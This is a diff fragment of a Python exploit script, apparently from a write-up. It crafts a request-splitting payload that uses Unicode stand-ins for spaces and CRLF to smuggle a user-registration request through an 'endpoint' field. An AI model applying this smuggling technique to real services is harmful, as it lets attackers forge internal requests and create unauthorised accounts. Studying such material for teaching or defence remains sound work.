@@ -207,7 +207,7 @@ test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A" # Co
 test = test + "\u010D\u010A" # blank line
 test = test + f"username={username_encoded}&password={password_encoded}\u010D\u010A" # payload register
 test = test + "\u010D\u010A" # blank line
-test = test + "GET\u0120"
+test = test + "GET\u0120" # GET 
 
 r = requests.post(url = url, json={'endpoint': test, 'city': 'Ha Noi','country': 'VN'})
 ```
